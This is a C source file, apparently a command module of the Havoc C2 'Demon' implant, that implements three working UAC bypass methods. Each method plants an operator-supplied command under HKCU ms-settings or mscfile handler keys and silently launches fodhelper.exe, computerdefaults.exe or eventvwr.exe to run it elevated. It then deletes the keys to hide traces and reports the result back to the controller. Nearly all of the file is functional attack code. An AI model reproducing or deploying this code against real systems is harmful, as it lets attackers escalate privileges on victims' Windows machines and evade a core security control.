/*
 * Command_Privesc.c - HVC-032 privilege-escalation commands
 *
 * DEMON_PRIVESC_UAC : bypass UAC by hijacking a HKCU COM handler and launching an
 *                     auto-elevated Windows binary.  Three methods are supported:
 *
 *   DEMON_PRIVESC_UAC_FODHELPER        (1) - ms-settings handler + fodhelper.exe
 *   DEMON_PRIVESC_UAC_COMPUTERDEFAULTS (2) - ms-settings handler + computerdefaults.exe
 *   DEMON_PRIVESC_UAC_EVENTVWR         (3) - mscfile    handler + eventvwr.exe
 *
 * All three methods share the same structure:
 *   1. Write the command to a HKCU registry key that the target binary reads on launch.
 *   2. ShellExecuteW the target binary.
 *   3. Delete the key tree (cleanup).
 */

#include <Demon.h>
#include <common/Macros.h>
#include <core/Command.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Parser.h>
#include <core/Win32.h>
#include <commands/Command_Privesc.h>

/* ---- typedefs for all function pointers used in this file ---- */

typedef LONG      (WINAPI *fnRegCreateKeyExW)( HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD );
typedef LONG      (WINAPI *fnRegSetValueExW)( HKEY, LPCWSTR, DWORD, DWORD, const BYTE *, DWORD );
typedef LONG      (WINAPI *fnRegDeleteTreeW)( HKEY, LPCWSTR );
typedef LONG      (WINAPI *fnRegCloseKey)( HKEY );
typedef HINSTANCE (WINAPI *fnShellExecuteW)( HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, INT );

/* ----------------------------------------------------------------
 * UacBypassViaRegistry
 *   Helper: write the two required registry values (Default + DelegateExecute),
 *   launch the target binary, then delete the HKCU key tree.
 *
 *   KeyPath   - HKCU sub-key path for the command handler
 *   CleanPath - HKCU sub-key root to delete on cleanup
 *   Binary    - executable to ShellExecuteW (e.g. L"fodhelper.exe")
 *   Command   - wide-string command to run with elevated privileges
 *
 *   Returns TRUE on launch success (not on elevated-process success - we
 *   cannot know that without waiting for a callback from the payload).
 * ---------------------------------------------------------------- */
static BOOL UacBypassViaRegistry(
    IN LPCWSTR KeyPath,
    IN LPCWSTR CleanPath,
    IN LPCWSTR Binary,
    IN PWCHAR  Command
) {
    HKEY  hKey  = NULL;
    DWORD Disp  = 0;
    LONG  Res   = 0;
    BOOL  Ok    = FALSE;

    /* Verify required function pointers are available. */
    if ( ! Instance->Win32.RegCreateKeyExW ||
         ! Instance->Win32.RegSetValueExW  ||
         ! Instance->Win32.RegDeleteTreeW  ||
         ! Instance->Win32.RegCloseKey     ||
         ! Instance->Win32.ShellExecuteW   )
    {
        PUTS( "UacBypass - required functions not available" )
        return FALSE;
    }

    /* --- Create/open the command handler key under HKCU. --- */
    Res = ( (fnRegCreateKeyExW) Instance->Win32.RegCreateKeyExW )(
        HKEY_CURRENT_USER,
        KeyPath,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        &Disp );

    if ( Res != ERROR_SUCCESS || ! hKey )
    {
        PRINTF( "UacBypass - RegCreateKeyExW failed: %ld\n", Res )
        return FALSE;
    }

    /* Set the default value to the command we want to execute elevated. */
    ( (fnRegSetValueExW) Instance->Win32.RegSetValueExW )(
        hKey,
        L"",
        0,
        REG_SZ,
        (const BYTE *) Command,
        (DWORD)( ( StringLengthW( Command ) + 1 ) * sizeof( WCHAR ) ) );

    /* Set DelegateExecute to an empty string - this triggers the auto-elevate
     * path in the target binary's COM handler lookup. */
    WCHAR Empty = L'\0';
    ( (fnRegSetValueExW) Instance->Win32.RegSetValueExW )(
        hKey,
        L"DelegateExecute",
        0,
        REG_SZ,
        (const BYTE *) &Empty,
        sizeof( WCHAR ) );

    ( (fnRegCloseKey) Instance->Win32.RegCloseKey )( hKey );
    hKey = NULL;

    /* --- Launch the auto-elevating binary. --- */
    ( (fnShellExecuteW) Instance->Win32.ShellExecuteW )(
        NULL,
        L"open",
        Binary,
        NULL,
        NULL,
        0 /* SW_HIDE */ );

    Ok = TRUE;
    PRINTF( "UacBypass - launched %ls\n", Binary )

    /* --- Brief pause to let the target binary read the key before we delete it. ---
     * Use NtWaitForSingleObject with a 2-second timeout on a non-signalled event. */
    {
        HANDLE    hEvt    = NULL;
        NTSTATUS  Status  = STATUS_SUCCESS;

        if ( Instance->Win32.NtCreateEvent )
        {
            OBJ_ATTR ObjAttr = { 0 };
            InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );
            Status = Instance->Win32.NtCreateEvent( &hEvt, EVENT_ALL_ACCESS, &ObjAttr, NotificationEvent, FALSE );
        }

        if ( NT_SUCCESS( Status ) && hEvt && Instance->Win32.NtWaitForSingleObject )
        {
            LARGE_INTEGER Timeout = { 0 };
            Timeout.QuadPart = -20000000LL; /* 2 seconds in 100-ns units */
            Instance->Win32.NtWaitForSingleObject( hEvt, FALSE, &Timeout );
            SysNtClose( hEvt );
            hEvt = NULL;
        }
    }

    /* --- Delete the HKCU key tree (cleanup). --- */
    ( (fnRegDeleteTreeW) Instance->Win32.RegDeleteTreeW )(
        HKEY_CURRENT_USER,
        CleanPath );

    return Ok;
}

/* ----------------------------------------------------------------
 * CommandPrivesc
 *   DataArgs - parser positioned after the CommandID field.
 *              Layout: SubCommand(int32), Method(int32), Command(wstring)
 * ---------------------------------------------------------------- */
VOID CommandPrivesc( IN PPARSER DataArgs )
{
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_PRIVESC );
    SHORT    SubCommand = (SHORT) ParserGetInt32( DataArgs );

    /* Echo back the sub-command so the client can route the response. */
    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {

        /* --------------------------------------------------------
         * DEMON_PRIVESC_UAC
         * Select a UAC bypass method and execute it.
         * -------------------------------------------------------- */
        case DEMON_PRIVESC_UAC: PUTS( "Privesc::UAC" )
        {
            SHORT  Method  = (SHORT) ParserGetInt32( DataArgs );
            UINT32 CmdLen  = 0;
            PWCHAR Command = ParserGetWString( DataArgs, &CmdLen );
            BOOL   Ok      = FALSE;

            PackageAddInt32( Package, Method );

            if ( ! Command || Command[ 0 ] == L'\0' )
            {
                PUTS( "Privesc::UAC - no command provided" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            switch ( Method )
            {
                /* ---- fodhelper.exe - ms-settings handler ---- */
                case DEMON_PRIVESC_UAC_FODHELPER:
                    PUTS( "Privesc::UAC - method: fodhelper" )
                    Ok = UacBypassViaRegistry(
                        L"Software\\Classes\\ms-settings\\Shell\\Open\\command",
                        L"Software\\Classes\\ms-settings",
                        L"fodhelper.exe",
                        Command );
                    break;

                /* ---- computerdefaults.exe - ms-settings handler ---- */
                case DEMON_PRIVESC_UAC_COMPUTERDEFAULTS:
                    PUTS( "Privesc::UAC - method: computerdefaults" )
                    Ok = UacBypassViaRegistry(
                        L"Software\\Classes\\ms-settings\\Shell\\Open\\command",
                        L"Software\\Classes\\ms-settings",
                        L"computerdefaults.exe",
                        Command );
                    break;

                /* ---- eventvwr.exe - mscfile handler ---- */
                case DEMON_PRIVESC_UAC_EVENTVWR:
                    PUTS( "Privesc::UAC - method: eventvwr" )
                    Ok = UacBypassViaRegistry(
                        L"Software\\Classes\\mscfile\\Shell\\Open\\command",
                        L"Software\\Classes\\mscfile",
                        L"eventvwr.exe",
                        Command );
                    break;

                default:
                    PRINTF( "Privesc::UAC - unknown method %d\n", Method )
                    break;
            }

            PackageAddInt32( Package, Ok ? TRUE : FALSE );
            break;
        }

        default:
            PRINTF( "Privesc: unknown sub-command %d\n", SubCommand )
            PackageAddInt32( Package, FALSE );
            break;
    }

    PackageTransmit( Package );
}
